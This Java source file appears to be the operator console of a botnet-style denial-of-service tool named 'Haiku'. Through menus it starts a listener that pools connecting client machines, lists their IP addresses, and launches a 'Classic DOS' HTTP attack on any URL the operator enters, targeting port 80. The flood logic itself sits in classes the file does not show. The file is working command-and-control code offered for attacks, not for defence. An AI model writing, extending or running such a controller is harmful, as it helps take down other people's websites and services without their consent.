package haiku.server.main;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Scanner;

import haiku.client.vectors.instances.ClassicDOS;
import haiku.server.classes.EventLog;
import haiku.server.pool.ClientConnectionManager;

public class HaikuMain {

	private ClientConnectionManager manager;

	public static void main(String[] args) {
		HaikuMain main = new HaikuMain();
		main.initialize();
		main.mainMenu();
		main.waitInput();
	}

	private void poolMenu() {
		showBanner();
		int options = ConsoleUtils.buildMenu("Start pool", "Stop pool", "View clients", "Back");
		switch (options) {
		case 1:
			ConsoleUtils.clearConsole();
			this.handleStartPool();
			this.poolMenu();
			break;
		case 2:
			ConsoleUtils.clearConsole();
			this.handleStopPool();
			this.poolMenu();
			break;
		case 3:
			ConsoleUtils.clearConsole();
			this.displayClients();
			this.poolMenu();
			break;
		case 4:
			ConsoleUtils.clearConsole();
			mainMenu();
			break;
		}
	}

	private void mainMenu() {
		showBanner();
		int opt = ConsoleUtils.buildMenu("Attack vectors", "Pool management", "Running attacks", "Show Event log",
				"Exit");

		switch (opt) {
		case 1:
			ConsoleUtils.clearConsole();
			attackTypes();
			break;
		case 2:
			ConsoleUtils.clearConsole();
			poolMenu();
			break;
		case 3:
			ConsoleUtils.clearConsole();
			manager.getOngoingAttacks().printRunningAttacks();
			mainMenu();
			break;
		case 4:
			ConsoleUtils.clearConsole();
			EventLog.getInstance().printLogs();
			mainMenu();
			break;
		}
	}

	private void attackTypes() {
		showBanner();
		int opt = ConsoleUtils.buildMenu("HTTP Attacks", "Back");
		switch (opt) {
		case 1:
			ConsoleUtils.clearConsole();
			httpAttacks();
			break;
		}
	}

	private void httpAttacks() {
		showBanner();
		int opt = ConsoleUtils.buildMenu("Classic DOS", "Back");
		switch (opt) {
		case 1:
			ConsoleUtils.clearConsole();
			System.out.println("URL: ");
			String url = ConsoleUtils.getScanner().next();

			this.manager.getOngoingAttacks().startNewAttack(ClassicDOS.class, url, 80);
			System.out.println("Started Classic DOS attack");
			break;
		}
	}

	private void displayClients() {
		if (!this.manager.isRunning()) {
			System.out.println("Pool is not running!");
			return;
		}
		System.out.println("-----");
		this.manager.getActiveConnections().forEach((c, v) -> {
			System.out.println("IP: " + v.getTarget().getInetAddress().toString() + " Last ping : (TODO)");
		});
		System.out.println("-----");
	}

	private void waitInput() {
		Scanner s = new Scanner(System.in);
		s.nextLine();
		s.nextLine();
		s.nextLine();
		s.close();
	}

	public void handleStartPool() {
		if (this.manager.isRunning()) {
			System.out.println("Pool is already running ... ");
		} else {
			this.manager.startListener();
			System.out.println("Started pool...");
		}
		showPoolStats();
	}

	public void handleStopPool() {
		if (!this.manager.isRunning()) {
			System.out.println("Pool is not running ... ");
		} else {
			this.manager.stopListener();
			System.out.println("Stopped pool...");
		}
	}

	public void showPoolStats() {
		try {
			System.out.println("-----------");
			System.out.println("Local IP: " + InetAddress.getLocalHost().toString() + " (localhost)");
			System.out.println("External IP: " + getIP());
			System.out.println("Port: " + this.manager.getPort());
			System.out.println("-----------");
		} catch (UnknownHostException e) {
		}
	}

	public String getIP() {
		try {
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));

			String ip = in.readLine(); // you get the IP as a String

			return ip;
		} catch (IOException e) {
			return "unknown";
		}
	}

	private void initialize() {
		this.manager = new ClientConnectionManager();

		new EventLog();
	}

	private void showBanner() {
		System.out.println("");
		System.out.println("	 ▄  █ ██   ▄█ █  █▀  ▄   ");
		System.out.println("	 █   █ █ █  ██ █▄█     █  ");
		System.out.println("	 ██▀▀█ █▄▄█ ██ █▀▄  █   █ ");
		System.out.println("	 █   █ █  █ ▐█ █  █ █   █ ");
		System.out.println("	    █     █  ▐   █  █▄ ▄█ ");
		System.out.println("	   ▀     █      ▀    ▀▀▀  ");
		System.out.println("	        ▀                 ");
		System.out.println("   No will be there to help you...");
		System.out.println("");
	}
}
